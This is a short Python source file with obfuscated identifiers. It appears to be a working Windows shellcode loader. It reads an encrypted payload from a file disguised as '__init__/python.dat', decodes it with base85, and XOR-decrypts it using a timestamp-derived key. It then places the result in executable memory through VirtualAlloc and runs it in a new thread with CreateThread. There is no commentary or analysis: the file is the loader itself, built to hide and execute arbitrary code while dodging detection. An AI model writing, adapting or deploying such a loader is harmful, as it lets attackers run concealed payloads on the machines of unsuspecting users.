
import base64 #line:1
import ctypes #line:2
import sys #line:3
def xor_encrypt_decrypt (O000OO0O00O0O0000 ,OO000O0000OOO00OO ):#line:6
    return bytes ([O0OO00OOOO0O00OO0 ^OO000O0000OOO00OO for O0OO00OOOO0O00OO0 in O000OO0O00O0O0000 ])#line:7
with open ('__init__/python.dat','r')as f :#line:10
    encoded_data =f .read ()#line:11
decoded_data =base64 .b85decode (encoded_data )#line:14
timestamp =1724304150#line:17
xor_key =timestamp %256 #line:18
decrypted_data =xor_encrypt_decrypt (decoded_data ,xor_key )#line:21
shellcode =bytearray (decrypted_data )#line:24
ctypes .windll .kernel32 .VirtualAlloc .restype =ctypes .c_uint64 #line:27
ptr =ctypes .windll .kernel32 .VirtualAlloc (ctypes .c_int (0 ),ctypes .c_int (len (shellcode )),ctypes .c_int (0x3000 |0x2000 ),ctypes .c_int (0x40 ))#line:35
buf =(ctypes .c_char *len (shellcode )).from_buffer (shellcode )#line:41
ctypes .windll .kernel32 .RtlMoveMemory (ctypes .c_uint64 (ptr ),buf ,ctypes .c_int (len (shellcode )))#line:46
handle =ctypes .windll .kernel32 .CreateThread (ctypes .c_int (0 ),ctypes .c_int (0 ),ctypes .c_uint64 (ptr ),ctypes .c_int (0 ),ctypes .c_int (0 ),ctypes .pointer (ctypes .c_int (0 )))#line:56
ctypes .windll .kernel32 .WaitForSingleObject (ctypes .c_int (handle ),ctypes .c_int (-1 ))
